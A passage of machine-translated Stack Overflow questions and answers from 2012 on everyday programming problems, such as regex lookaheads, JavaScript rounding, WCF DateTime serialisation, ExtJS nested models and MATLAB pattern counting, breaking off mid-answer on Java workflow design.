/^(\$?(?=\d*(\.\d{1,3})?$))|^(\$?\((?=\d*(\.\d{1,3})?\)$))/ 
```

但如果值只是 $，上面的正则表达式会失败

我想如果价值只是 $ 那么它应该不接受它..

但同时它也应该接受空白值..

请帮我。

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:37:01.333

看起来你的整数部分从来都不是可选的，所以你应该确保正则表达式使它成为强制性的（现在，即使是空字符串也会通过你的正则表达式）：

```
/^\$?(?:\d+(?:\.\d{1,3})?$|\(\d+(?:\.\d{1,3})?\)$)/ 
```

`\d+`意思是“一个或多个数字”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:55:56.410

我将我的正则表达式更改为：

```
^(\$?(?=\d+(\.\d{1,3})?$))|^(\$?\((?=\d+(\.\d{1,3})?\)$))|^((?=\d*(\.\d{1,3})?$)) 
```

它为我工作..

# cocoa-touch - 在触摸中执行动画

> ID：12839639
> 
> 赞同：0
> 
> 时间：2012-10-11T12:33:15.580
> 
> 标签：cocoa-touch, cocos2d-iphone

我想在我的触摸检测到时执行动画。我有 60 张用于执行动画的图像。30 幅图像用于右侧移动，如 3d 效果，30 幅图像用于左侧移动。

我的设备方向是横向。查询是当我的触摸从右向左移动然后执行左侧动画时，当我的触摸从左向右移动时执行右侧动画。

我怎么能做这种类型的东西？

如果有人有建议，请放置示例代码或任何链接。

提前致谢。

# scala - 电梯 - 注册后显示通知

> ID：12839643
> 
> 赞同：2
> 
> 时间：2012-10-11T12:33:35.113
> 
> 标签：scala, lift

使用 Lift，我想在用户注册后向他们显示一条通知，例如：

```
S.notice("Thank you for signing up") 
```

我应该把这段代码放在哪里，或者我应该有其他方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:47:44.460

您应该能够将它放在代码中的任何位置以在当前页面上输出。但是，如果您的代码处理表单提交，然后重定向到一个单独的页面 - 您可能需要这样的东西：

```
S.redirectTo("/confirm", () => S.notice("Thank you for signing up")) 
```

这将发出带有状态的重定向。以上执行重定向后的功能 - 导致显示消息。

对于 ProtoUser，API 中有几个地方（http://scala-tools.org/mvnsites/liftweb-2.4/#net.liftweb.mapper.MegaProtoUser）似乎可以工作：

```
 user.toForm("Create User", 
   (u:UserType) => S.notice("Thank you for signing up")) 
```

或者你可以尝试调用（或者如果你想要永久覆盖）这个方法：

```
 doPostCommit(() => S.notice("Thank you for signing up") 
```

# ruby - 用正则表达式拆分 Ruby 字符串

> ID：12839645
> 
> 赞同：22
> 
> 时间：2012-10-11T12:33:47.550
> 
> 标签：ruby, regex, metaprogramming

这是**Ruby 1.8.7**但应该与 1.9.x 相同

我正在尝试拆分字符串，例如：

```
a = "foo.bar.size.split('.').last"
# trying to split into ["foo", "bar","split('.')","last"] 
```

基本上将其拆分为它所代表的命令，我正在尝试使用 Regexp 但不确定如何，想法是使用 regexp

```
a.split(/[a-z\(\)](\.)[a-z\(\)]/) 
```

这里尝试使用 group`(\.)`来拆分它，但这似乎不是一个好方法。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2012-10-11T12:37:16.607

我认为这会做到：

```
a.split(/\.(?=[\w])/) 
```

我不知道您对正则表达式了解多少，但这`(?=[\w])`是一个前瞻，它说“如果下一个字符是字母类型的字符，则仅匹配点”。前瞻实际上不会抓取它匹配的文本。它只是“看起来”。所以结果正是您正在寻找的：

```
> a.split(/\.(?=[\w])/)
 => ["foo", "bar", "size", "split('.')", "last"] 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-10-11T13:08:20.710

恐怕正则表达式不会带你走太远。例如，考虑以下表达式（它们也是有效的 Ruby）

```
"(foo.bar.size.split( '.' )).last"
"(foo.bar.size.split '.').last"
"(foo.bar.size.split '( . ) . .(). .').last" 
```

问题是，调用列表实际上是调用树。最简单的解决方案可能是使用 Ruby 解析器并根据您的需要转换解析树（在此示例中，我们递归地下降到调用树，将调用收集到一个列表中）：

```
# gem install ruby_parser
# gem install awesome_print
require 'ruby_parser'
require 'ap'

def calls_as_list code
    tree = RubyParser.new.parse(code)

    t = tree
    calls = []

    while t
        # gather arguments if present
        args = nil
        if t[3][0] == :arglist
            args = t[3][1..-1].to_a
        end
        # append all information to our list
        calls << [t[2].to_s, args]
        # descend to next call
        t = t[1]
    end

    calls.reverse
end

p calls_as_list "foo.bar.size.split('.').last"
#=> [["foo", []], ["bar", []], ["size", []], ["split", [[:str, "."]]], ["last", []]]
p calls_as_list "puts 3, 4"
#=> [["puts", [[:lit, 3], [:lit, 4]]]] 
```

并显示任何输入的解析树：

```
ap RubyParser.new.parse("puts 3, 4") 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-11T15:04:01.633

```
a = "foo.bar.size.split('.').last"
p a.split(/(?<!')\.(?!')/)

#=> ["foo", "bar", "size", "split('.')", "last"] 
```

您正在寻找 Lookahead 和 Lookbehind 断言。 [http://www.regular-expressions.info/lookaround.html](http://www.regular-expressions.info/lookaround.html)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-11T12:48:09.467

这里我没有 ruby​​ 环境。我尝试使用 python re.split()。

```
In : re.split("(?<!')\.(?!')",a)
Out: ['foo', 'bar', 'size', "split('.')", 'last'] 
```

上面的正则表达式有负前瞻**和**后瞻，以确保只有单引号**之间**的“点”不能用作分隔符。

当然，对于您给出的示例，lookbehind 或lookahead 之一就足够了。您可以根据自己的要求选择正确的方式。

# regex - 正则表达式在多个文件中搜索和替换（批量） - 无需打开文件

> ID：12839647
> 
> 赞同：-1
> 
> 时间：2012-10-11T12:34:13.443
> 
> 标签：regex, replace, bulk

我通常使用记事本++来搜索和替换我需要的东西（正则表达式），但是，我必须打开我需要的所有文件，才能替换需要替换的文件。我的问题是我该如何批量做到这一点（多个）文件，在一个文件夹中，而不打开任何文件？有没有好的免费软件可以做到这一点？或类似创建 .bat 或 .pl 文件，并在文件夹中运行它以执行替换？如果是这样，怎么办？

简单的例子：

```
<b>(\d+\. )</b> 
```

至

```
\1 
```

此正则表达式删除数字中的粗体标记。Windows下不使用NP++如何处理大容量文件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T12:36:51.273

使用 Notepad++ 自己的*Find in files*功能，您可以在*Find*菜单中找到该功能。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T13:38:50.707

这可以用这个 perl oneliner 来完成：

```
perl -pi.back -e 's#<b>(\d+\.\d+)</b>#$1#g;' file* 
```

这将处理所有名称以开头的文件`file`并将它们保存到 `fileX.back`.

# php - FuelPHP数据库查询错误：无法访问受保护的属性

> ID：12839651
> 
> 赞同：0
> 
> 时间：2012-10-11T12:34:30.873
> 
> 标签：php, fuelphp

我是 FuelPHP 新手，我有一个查询问题。所以，这是我的代码：

```
$query = DB::query('SELECT * FROM `table`');
$result = $query->execute();
$totals = $result->_total_rows;
print_r($totals); 
```

而且我不断收到以下错误：致命错误：无法访问受保护的属性 Fuel\Core\Database_MySQL_Result::$_total_rows

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:48:22.193

如果您只想要查询返回的行数

```
$query = DB::query('SELECT * FROM `table`');
$result = $query->execute();
// Just count the results, it returns an int.
$totals= count($result); 
```

参考手册中的[here](http://docs.fuelphp.com/classes/database/usage.html#/results)

或者在您的情况下，当您从表中选择所有并计算它时，您可以使用以下内容

```
DB::count_records('table'); 
```

参考手册中的[here](http://docs.fuelphp.com/classes/database/db.html#/method_count_records)

# java - 如何测试 struts 2.0.x 应用程序

> ID：12839655
> 
> 赞同：1
> 
> 时间：2012-10-11T12:34:44.853
> 
> 标签：java, unit-testing, struts2, junit

我们如何测试用 2.0.x 版本编写的应用程序的动作类？

我通读了[这个链接](http://struts.apache.org/2.x/docs/junit-plugin.html)，发现 struts-junit 插件仅适用于 struts 2.1.1 或更高版本。

我的应用程序是使用 struts 2.0.11 编写的，我认为在我的项目中升级版本并不容易。

考虑到这些限制，我们如何对 Action 类进行单元测试？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:42:49.573

您想测试您的动作课程的任何特殊方面吗？

只要您的操作类被编写为 POJO，您就可以使用您选择的任何测试框架将它们作为普通 Java 类进行测试。

**编辑：**试试这个扩展 JUnit 类的[自定义](http://depressedprogrammer.wordpress.com/2007/06/18/unit-testing-struts-2-actions-spring-junit/)`TestCase`类。你需要依赖[org.springframework: spring-mock](http://mvnrepository.com/artifact/org.springframework/spring-mock)。

# visual-studio - Visual Studio 如何确定解决方案文件的版本？

> ID：12839660
> 
> 赞同：25
> 
> 时间：2012-10-11T12:34:59.970
> 
> 标签：visual-studio

认为我有两个解决方案：vs2009.sln 和 vs2010.sln。两个解决方案文件具有相同的扩展名 (.sln)，但它们具有不同的图标。并在相关版本的visual studio中打开。我想知道视觉工作室如何确定这一点？

编辑：Visual Studio 版本选择器没问题，但我想知道即使扩展名相同，图标怎么会不同？我曾经知道每个扩展在注册表中只有一个图标 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Current Version\explorer\Shell Icons

2.编辑：我终于找到了答案。如果有人对此感到疑惑，答案就在这里[http://msdn.microsoft.com/en-us/library/cc144122%28VS.85%29.aspx](http://msdn.microsoft.com/en-us/library/cc144122%28VS.85%29.aspx)

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2015-09-24T03:56:22.117

使用记事本或其他文本编辑器打开您的 .sln 文件。`Format Version`在与 Visual Studio 版本相关的第一行中查找。以下是我熟悉的一些：

*   格式版本 8.00 是 Visual Studio 2003
*   格式版本 9.00 是 Visual Studio 2005
*   格式版本 10.00 是 Visual Studio 2008
*   格式版本 11.00 是 Visual Studio 2010
*   格式版本 12.00 是 Visual Studio 2013

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-10-11T12:36:27.227

解决方案文件是文本文件。

第一行包含版本信息。

例如，对于 Visual Studio 2010 解决方案，您会发现：

```
Microsoft Visual Studio Solution File, Format Version 11.00 
```

此外，当您安装了多个不同版本的 Visual Studio 时，该`.sln`文件将通过 Visual Studio 版本选择器实用程序读取此文件并打开相应版本的 Visual Studio。检查`.sln`文件关联。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-11T12:37:32.637

尝试在记事本中打开 .sln

第一行本身说`Microsoft Visual Studio Solution File, Format Version 10.00`or 11 或任何版本

# javascript - 舍入计算值在 JS

> ID：12839662
> 
> 赞同：0
> 
> 时间：2012-10-11T12:35:13.567
> 
> 标签：javascript, html

请原谅我这个愚蠢的问题，但我是一个 JS 菜鸟。

我创建了以下代码，但无法对其进行舍入（2 位小数）。

请帮忙！

```
<html>  
<head>  
<title>Simple Calc</title>  
<script language="javascript" type="text/javascript">  
function combineder(){  
a=Number(document.calculator.number1.value);  
b=Number(document.calculator.number2.value);
c=(a/452)/(b/100)
document.calculator.total.value=c;  
}  
</script>  
</head>  
<body>  
<form name="calculator">  
A: <input type="text" size="2"name="number1">   
<BR>  
B: <input type="text" name="number2">   
<BR>
<input type="button" value="Calculate!" onclick="javascript:combineder();">  
<br>
Your results is: $<input type="text" name="total">   

</form>  

</body>  
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:37:58.107

首先，您不应该`javascript:etc...`在属性中使用，我认为您与将javascript 作为 url 执行`onclick`的属性混淆了。`href`相反，您应该简单地拥有`onclick="combineder();"`

其次，你应该使用`var`在局部范围内声明变量，这样它们就不会与全局命名空间中的其他变量发生冲突。像这样声明变量：`var c = 123;`

对于您的问题，您可以这样做以四舍五入到 2 dp - 这不会留下尾随 0

```
// ...
var c=(a/452)/(b/100)
c = Math.round(c*100)/100
// ... 
```

或者这个，它总是会留下尾随的 0，并将作为数字的字符串表示形式返回

```
// ...
var c=(a/452)/(b/100)
c = c.toFixed(2)
// ... 
```

## 相关答案：[https ://stackoverflow.com/a/7343013/665261](https://stackoverflow.com/a/7343013/665261)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:39:08.970

只需使用

```
.toFixed(2); 
```

减少到小数点后两位

或者你可以使用

```
Math.round(); 
```

圆它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:37:08.963

尝试使用`.toFixed()`. 这是一个例子

```
var myNum = 10.45621;
var newNum = myNum.toFixed(2); 
```

只需将您希望四舍五入的小数位数传递给该`.toFixed()`方法即可。请[在此处](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Number/toFixed)`toFixed()`查看该方法的更多信息。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T12:37:31.180

JavaScript 有[number.toFixed( [digits] )](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Number/toFixed)

你想要两个地方，所以它会是

```
document.calculator.total.value=c.toFixed(2); 
```

# android - Android SearchView.getQuery() 返回 null

> ID：12839668
> 
> 赞同：3
> 
> 时间：2012-10-11T12:35:30.063
> 
> 标签：android, actionview, searchview

我有一个搜索小部件作为可折叠的操作视图。我想保存用户输入的关于设备旋转的查询。我试过用

searchView.getQuery().toString();

在我的代码中的不同位置。

我面临的问题是它总是返回什么/空。可能是什么问题？

# iphone - iPhone 的文本到语音库

> ID：12839671
> 
> 赞同：6
> 
> 时间：2012-10-11T12:35:31.727
> 
> 标签：iphone, libraries, text-to-speech

> **可能重复：**
> [iPhone 上的文字转语音](https://stackoverflow.com/questions/416064/text-to-speech-on-iphone)

如何开始在[iPhone](http://en.wikipedia.org/wiki/IPhone)中进行文本到语音转换？

我想阅读用户输入的文本。有没有可用的库或演示？我经历了其中的一些，但我不明白从哪里开始。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-10-11T12:43:27.950

对于在线，您可以使用我的**[Google-TTS-Library-For-iOS](https://github.com/shamsudheen/Google-TTS-Library-For-iOS)**来实现您的目标。

离线**iPhone TTS**实施很容易做到。您可以在[此处](https://bitbucket.org/sfoster/iphone-tts/)查看详细信息。

有许多付费和免费的**iOS TTS 库**可供使用。

他们是 ，

### 免费（离线/在线）

*   [iphone-tts](https://bitbucket.org/sfoster/iphone-tts/src) 注意：阅读“如何使用”部分。
*   [TTSOverview-iOS](https://github.com/meredian/TTSOverview-iOS)
*   [flite-1.4-iphone](https://bitbucket.org/sfoster/iphone-tts/src/a6502c779cd3/flite-1.4-iphone/)
*   [开耳](http://www.politepix.com/openears/#)
*   [cmu.edu](http://www.speech.cs.cmu.edu/flite/)
*   [RJGoogleTTS](https://github.com/hbashirNaij/RJGoogleTTS)
*   [人声套件](https://github.com/KingOfBrian/VocalKit)

### 付费（在线）

*   [iSpeech iOS SDK](https://www.ispeech.org/developers/iphone)（TTS 和 ASR）
*   [细微差别龙听写](http://www.nuance.com/index.htm)
*   [阿卡帕拉](http://www.acapela-group.com/text-to-speech-interactive-demo.html)
*   [伊沃纳](http://developer.ivona.com/)
*   [新语音](http://www.neospeech.com/tts-engine.aspx)

# actionscript-3 - 我的 Sound 对象使用了太多内存并导致我的应用程序崩溃。如何清空对象数据的前半部分？

> ID：12839673
> 
> 赞同：1
> 
> 时间：2012-10-11T12:35:34.227
> 
> 标签：actionscript-3, flash, memory, memory-management, stream

我目前正在研究 AS3 中的动态 MP3 播放器。该播放器还将支持连续（长度）的无线电流。

因为我的播放器将包含一个“搜索”栏，所以我允许用户搜索 Sound 对象的数据。现在我知道，对于连续流，存储在用户 RAM 上的数据永远不会停止，因为下载永远不会在连续流上停止。这意味着，经过几个小时的流式传输，我的应用程序正在使用分配的 RAM。我已经在我自己的机器上测试了这个应用程序，运行一个非常高的规格，并且应用程序在我的浏览器中崩溃了。当我说应用程序崩溃时，我指的是整个 Flash，这意味着我必须重新启动浏览器才能再次使用 Flash。我知道我的应用程序是原因，因为 Flash 过去从未崩溃过。只有当我的应用程序已经流式传输 2 个多小时时才会这样做。

所以我想做的就是只允许用户缓存长达一个小时的音频。一个小时后，我想清除前半小时的声音对象数据，这意味着只有最近半小时的音频被存储并可供查找。

所以我有我的流：

```
var soundObj:Sound = new Sound();
soundObj.load(new URLRequest('stream.mp3'));
//ect ect 
```

并且`sound`是存储数据的地方。所以我的问题是：如何清除该对象的前 30 分钟音频？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:44:38.453

也许这个`Sound`类并不意味着可靠地播放“无限”的 MP3 文件，这似乎是你的情况。它是用来播放普通 MP3“歌曲”的。两小时的 MP3 声音很容易累积到超过 200 兆字节的数据。

但是有一个很好的解决方案 - 使用`NetConnection`和`NetStream`类来流式传输音频。那里有很多教程。您还可以流式传输您的 MP3，只是有点不同 - 将涉及一个中央服务器，它将即时对这些 MP3 进行转码，以真正的“流式传输”方式将其传送给您。其中一种服务器是 Adob​​e Flash Media Server，它是 Adob​​e 的一款价格过高的作品。存在许多免费和开源的替代品，它们可以很好地满足您的目的 - Red5、nginx-rtmp 等等，我已经自己测试过了。

# c# - 将日期时间转换为 json 格式时出现 WCF 错误

> ID：12839674
> 
> 赞同：5
> 
> 时间：2012-10-11T12:35:36.420
> 
> 标签：c#, json, wcf

我有一个返回 JSON 的 WCF 服务。

从今天早上开始，我开始收到以下错误：

```
DateTime values that are greater than DateTime.MaxValue or smaller than DateTime.MinValue when converted to UTC cannot be serialized to JSON 
```

只是为了测试，我将今天的日期传递给使用 JSON 返回的所有 DateTime 变量，但我仍然得到相同的错误。

该代码大约有 2k 行，所以我认为在这里发布它没有任何价值。

知道如何解决吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-11T12:50:53.940

我怀疑你有一个`DateTime`未初始化的值 - 默认为`DateTime.MinValue`本地时间。如果您的本地时区早于 UTC，则无法将其转换为 UTC，因为这样做会导致负值`Ticks`。

要么找到未初始化的值并更正它，要么[搬到美国](http://lp.green-card-us.org/AllSites/1436/Pages/site/LandingPage.asp):)

另一种解决方案可能是使用可为空的值（`DateTime?`代替`DateTime`）。

这默认为`null`而不是`DateTime.MinValue`，因此您应该能够序列化未初始化的值。

# excel - 如何使用 VBScript 在另一台计算机上运行 Excel 电子表格

> ID：12839676
> 
> 赞同：0
> 
> 时间：2012-10-11T12:35:50.617
> 
> 标签：excel, vbscript, automation

我有以下情况：

我的网络上的另一台计算机上保存了一个 Excel 工作簿。我需要在该计算机上执行该文件，因为它与大屏幕相连以显示一些数据。我试图自动执行工作簿，但我能得到的只是让它在我的电脑上运行，我需要它在那台电脑上运行

我正在使用的 vbs 代码的相关部分如下：

```
Set objXL = CreateObject("Excel.Application")
objXL.Visible = True
Set objXLWorkbook = objXL.Workbooks.Open(path) 
```

我知道这种方法只能在我的电脑上打开工作簿。有人知道如何让它在另一台计算机上运行 Excel 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T13:57:46.293

您不能开箱即用地在远程计算机上运行程序或脚本。否则，远程安装病毒将比现在更容易。您的 vbs 可以简单地安装和激活病毒而不是 excel 文件。

尽管如此，这是一件很常见的事情，人们经常想要做（远程任务，而不是病毒——尤其是管理员喜欢通过远程打开一些有趣的东西来吓唬用户）。

看看[Bill Stewart 的一篇文章](http://www.windowsitpro.com/article/windows-powershell/powershell-run-programs-remotely-141270)，他解释了如何使用 Powershell 来完成您的任务。远程计算机上所需的设置仍需要完成一次。

# clang - 将 clang 编译器诊断写入结构化文件

> ID：12839679
> 
> 赞同：6
> 
> 时间：2012-10-11T12:35:57.120
> 
> 标签：clang

使用 clang 时，以结构化格式（例如 XML 文件或类似文件）获取发出的编译警告和错误的最佳方法是什么？

我知道命令行选项--serialize-diagnostics，但是序列化数据格式是二进制的，我没有找到如何解码它的描述。

我的另一个选择是编写一个可以自己发出警告和错误的clang插件，例如XML。

我还有什么其他选择？文本解析对我来说不是一个选项，我需要来自 clang 的结构化数据。

# asp.net - 找不到引用合同的默认端点元素

> ID：12839683
> 
> 赞同：0
> 
> 时间：2012-10-11T12:36:13.267
> 
> 标签：asp.net, .net, wcf, web-services, c#-4.0

我创建了一个 WCF Web 服务，我从 ASP.NET 1.1 网站调用它。

我添加了一个简单的操作合同来发送一个字符串值 = 它工作。

***关于 WCF Web 服务的信息***

> > 我在 WCF Web 服务中添加了一个 DLL。我正在访问操作合同中 DLL 的公开方法。

*但是我在调​​用运营合同时遇到了一个问题：*

在 Web 服务中，我引用/添加了一个 DLL，它公开了一些方法，并且我在我的一个操作合同中调用了这些方法。 **description7a.Description7aPortType = 这来自我在 WCF 服务中添加的 DLL。**

它给出错误：

```
 Could not find default endpoint element that references contract
    'description7a.Description7aPortType' in the ServiceModel client 
    configuration section. This might be because no configuration file was
    found for your application, or because no endpoint element matching this 
    contract could be found in the client element. 
```

我怎样才能解决这个问题？

WCF Web服务的WEB配置

```
<system.serviceModel>
    <services>
      <service name="ADSChromeVINDecoder.Service" behaviorConfiguration="asmx">
        <endpoint address="basic" binding="basicHttpBinding"
                contract="ADSChromeVINDecoder.IService"></endpoint>
      </service>
    </services>
    <behaviors>
      <serviceBehaviors>
        <behavior name="asmx">
          <!-- To avoid disclosing metadata information, set the value below to false and remove the metadata endpoint above before deployment -->
          <serviceMetadata httpGetEnabled="true"/>
          <!-- To receive exception details in faults for debugging purposes, set the value below to true.  Set to false before deployment to avoid disclosing exception information -->
          <serviceDebug includeExceptionDetailInFaults="true"/>
        </behavior>
      </serviceBehaviors>
    </behaviors>
    <serviceHostingEnvironment multipleSiteBindingsEnabled="true" />
  </system.serviceModel> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T09:15:23.840

添加 DLL 使用的 Web 服务的服务引用完成了端点设置本身。

# image - 在 TIFF 中绘制热图时的垂直白线

> ID：12839684
> 
> 赞同：7
> 
> 时间：2012-10-11T12:36:14.563
> 
> 标签：image, r, plot, tiff, lines

`matrix`当我将函数绘制`image`为 TIFF 文件时，我经常会得到垂直或水平线。

我的矩阵是 150000 行 x 2000 列，在绘制 150000 行 x 100 列的矩阵时也会出现这些线。结果是一样的。

线条从何而来？这是某种像素化的神器吗？我几乎总是得到它们。

矩阵如下所示：

```
 V999 V1000 V1001 V1002 V1003 V1004 V1005 V1006 V1007 V1008 V1009 V1010
[1,]    1     4     0     0    15    15    15    15     8     0     1     0
[2,]    0     3    12     5    15    15    15     1    15     4     0     2
[3,]    0     0     0     3     6    15    15    15    15    15     0     3
[4,]    3     6    15    15    15    15    15     0     3    15    15     2
[5,]   15    15    15     0     3    15    15     2     1     5     8    11
[6,]    2     1     5     8    11    15    15    15     0     0     4     3

tiff("test.tiff", width=450, height=1100) 
image(t(mc),  col = col1, main="950-1500"
dev.off() 
```

任何提示/评论将不胜感激。

![在此处输入图像描述](../Images/28cf93e2a2c67e42d7ba6685b7d8d2be.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T20:35:32.547

您从 x11() 显示中看到了混叠伪影。您可以尝试拖动窗口使其变大或变小，最终您会找到与所需分辨率兼容的窗口大小高度和宽度。

# matlab - 在matlab中封装代码

> ID：12839685
> 
> 赞同：0
> 
> 时间：2012-10-11T12:36:21.197
> 
> 标签：matlab, design-patterns

我的代码是

```
 pathname=uigetdir;
 filename=uigetfile('*.txt','choose a file name.');
 data=importdata(filename);
 element= (data.data(:,10));
 in_array=element; pattern= [1 3];
 locations = cell(1, numel(pattern));
 for p = 1:(numel(pattern))
 locations{p} = find(in_array == pattern(p));
 end

 idx2 = [];
 for p = 1:numel(locations{1})
 start_value = locations{1}(p);
      for q = 2:numel(locations)

      found = true;

         if (~any((start_value + q - 1) == locations{q}))
         found = false;
         break;
         end

      end

    if (found)
      idx2(end + 1) = locations{1}(p);
    end

 end
[m2,n2]=size(idx2)

res_name= {'one' 'two'};
res=[n n2]; 
```

在这段代码中，我在数据文件的一列中找到了一个模式，并计算了它重复了多少次。

我有 200 个文件，我想对它们做同样的事情，但不幸的是我被卡住了。

这是我到目前为止添加的

```
 pathname=uigetdir;
 files=dir('*.txt');
 for k=1:length(files)
   filename=files(k).name;

    data(k)=importdata(files(k).name);

    element{k}=data(1,k).data(:,20);
    in_array=element;pattern= [1 3];
    locations = cell(1, numel(pattern));
    for p = 1:(numel(pattern))
    locations{p} = find(in_array{k}== pattern(p));
    end
    idx2{k} = []; 
```

我怎样才能继续这段代码..？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T15:33:45.513

OK，首先定义这个函数：

```
function [inds, indsy] = findPattern(M, pat, dim)

    indices = [];

    if nargin == 2 
        dim = 1;
        if size(M,1) == 1
            dim = 2; end
    end

    if dim == 1        

        if numel(pat) > size(M,1)            
            return; end

        for ii = 1:size(M,2)
            inds = findPatternCol(M(:,ii), pat);
            indices = [indices; repmat(ii,numel(inds),1)   inds]%#ok
        end

    elseif dim == 2

        if numel(pat) > size(M,2)            
            return; end

        for ii = 1:size(M,1)
            inds = findPatternCol(M(ii,:).', pat);            
            indices = [indices; inds   repmat(ii,numel(inds),1)]%#ok
        end

    else

    end

    inds = indices;
    if nargout > 1        
        inds  = indices(:,1);
        indsy = indices(:,2);
    end

end

function indices = findPatternCol(col, pat)    
    inds = find(col == pat(1));
    ii = 1;
    prevInds = [];
    while ~isempty(inds) && ii<numel(pat) && numel(prevInds)~=numel(inds)
        prevInds = inds;
        inds = inds(inds+ii<=numel(col) & col(inds+ii)==pat(ii+1));
        ii = ii + 1;
    end
    indices = inds(:);
end 
```

这很不错，但可能不是最有效的。如果性能成为问题，请从这里开始优化。

现在循环遍历每个文件，如下所示：

```
pathname = uigetdir;

files = dir('*.txt');
indices = cell(length(files), 1);
for k = 1:length(files)

    filename = files(k).name;    
    data(k) = importdata(files(k).name);

    array = data(1,k).data(:,20);
    pattern = [1 3];

    indices{k} = findPattern(array, pattern);

end 
```

可以像这样找到模式的出现次数：

```
counts = cellfun(@(x)size(x,1), indices); 
```

# model - Extjs4 hasMany() relationship not loading from Store's 'data' property

> ID：12839695
> 
> 赞同：0
> 
> 时间：2012-10-11T12:37:00.647
> 
> 标签：model, extjs4, extjs

The data property of my Extjs4 Store class describes an object hierarchy. I put this as the data property of my store because the data is static; there's no need to make an extra call to the server to populate the store. I've done this before, but this time my hasMany relationship isn't getting populated. I've tried a variety of ways to fix this, but I'm stumped. Would you take a look at it to see if I'm missing something?

The relationship of objects is: `MarineForm has MarineFormSections which has MarineFormFields`

**The store with it's data property**:

```
Ext.define('MAP.store.MarineFormStore', {
    extend: 'Ext.data.Store',
    model: 'MAP.model.MarineForm',
    data:[
        {
            species:'Mackerel',
            gear:null,
            sections:[
                {
                    name:'General Info',
                    formFields:[
                        {
                            xtype:'textfield',
                            name:'firstField',
                            allowBlank:false,
                            fieldLabel:'First Field'
                        }
                    ]
                }
            ]
        }
    ]

}); 
```

**The root model**:

```
Ext.define('MAP.model.MarineForm', {
    extend: 'Ext.data.Model',

    fields: [
        {name: 'species', type: 'string'},
        {name: 'gear', type: 'string'}
    ],

    hasMany: {
        model: 'MAP.model.MarineFormSection',
        name: 'sections'
    }

}); 
```

**The hasMany class**:

```
Ext.define('MAP.model.MarineFormSection', {
    extend: 'Ext.data.Model',

    fields: [
        'id',
        {name: 'name', type: 'string'}
    ],

    hasMany: {
        model: 'MAP.model.MarineFormField',
        name: 'formFields'
    }

}); 
```

**the hasMany's hasMany class (third layer nested)**

```
Ext.define('MAP.model.MarineFormField', {
    extend: 'Ext.data.Model',

    fields: [
        'name',
        {name:'allowBlank', type:'boolean'},
        'fieldLabel',
        'xtype',
        //next ones are for comboboxes. Not used all the time. -jg
        'store',
        'valueField',
        'displayField'
    ]
}); 
```

Here's the output from querying the store within Chrome:

```
rootStore = Ext.getStore('MarineFormStore') // -> the store
sections = rootStore.getAt(0).sections() // -> hasMany store
sections.getCount() // -> 0 
```

I've tried:

1.  Removing the `MarineFormField hasMany` block for `MarineFormFields`
2.  Adding an id to the `MarineFormField`
3.  Triple checking for any typos in the the root store's `data` field

Thanks for taking the time!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T13:17:39.817

It appear to me that all you are missing is this in your store config (or unlikely you just forgot to load the store):

```
proxy: {
    type: 'memory',
    reader: {
        type: 'json',
    }
}, 
```

[This JsFiddle](http://jsfiddle.net/Izhaki/NRQwd/1/) is pretty much your code with this change included and it seems to work just fine.

# java - Java“工作流”设计

> ID：12839701
> 
> 赞同：6
> 
> 时间：2012-10-11T12:37:12.357
> 
> 标签：java, workflow

我想问一下关于设计“工作流合并”的问题。我有几个彼此不太相似的工作流程。但是，有时我想将它们组合起来，稍微修改一下。让我给你举个例子 ：

> ### 工作流程 1 - 旅行
> 
> A1（收拾行李）-> A2（离开家）-> A3（赶公共汽车）-> A4 ...
> 
> ### 工作流程 2 - 每日植物浇水
> 
> B1（打开水）-> B2（离开房子）-> B3（给植物浇水）-> B4（进入房子）-> B5（关闭水）

星期天，我想去旅行，我也需要给植物浇水。所以我想创建类似**A1 -> B1 to B5 -> A2...**的东西。我还希望有可能告诉我的朋友完成浇水，这将是**A1 -> B1 到 B2 -> C1（将任务传递给朋友）-> A3** ...如您所见，流程很简单——里面没有分叉和连接，我不需要这样的功能。我所需要的只是创建一个线性命令列表，并可以轻松地将它们合并在一起。目前，所有代码片段都是 Java 方法（我想让它们像原子流一样）。

我的方法的主要目标应该是避免一遍又一遍地输入相同的代码。流程可能有数百个步骤。我想做一个类似**Execute flow A 的语句，但不是运行 A2 和 A3，而是执行 B2 到 B6 并继续 A**。

我有两个主要问题：

*   是否有任何框架已经支持这一点？如果有，对我的目的来说是不是太复杂了？
*   如果不是，那么实施此类事情的最佳方法是什么？

注意：您能否具体说明我的问题有什么不清楚的地方？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T19:32:05.253

我个人觉得这个需求可以在不使用任何特定框架的情况下实现。您可以按如下方式设计应用程序：

